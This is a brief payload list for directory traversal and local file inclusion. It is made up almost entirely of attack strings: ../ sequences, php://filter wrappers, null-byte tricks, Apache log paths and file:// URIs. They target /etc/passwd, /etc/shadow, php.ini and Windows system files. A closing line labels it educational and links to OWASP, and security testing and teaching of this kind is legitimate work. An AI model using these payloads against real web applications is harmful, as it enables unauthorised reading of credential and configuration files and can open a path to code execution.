**Directory Traversal:**

*satyam mavi*

../../../../../../etc/passwd
../../../etc/shadow
../../../../../../etc/hosts
../../../../../../etc/hostname

# PHP Wrappers:
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=/etc/shadow
php://filter/convert.base64-encode/resource=/etc/hosts
php://filter/convert.base64-encode/resource=/etc/php.ini



# Null Byte Injection:
/etc/passwd%00
/etc/shadow%00
/etc/hosts%00
/etc/php.ini%00

# Apache Log File Inclusion:
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache2/error.log

# Arbitrary File Inclusion:
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/php.ini

# Windows File Inclusion:
C:/windows/system32/drivers/etc/hosts
C:/boot.ini
file:///C:/windows/win.ini

# reference
**link**
owasp.org/www-community/attacks/Path_Traversal
**this link for learning education**
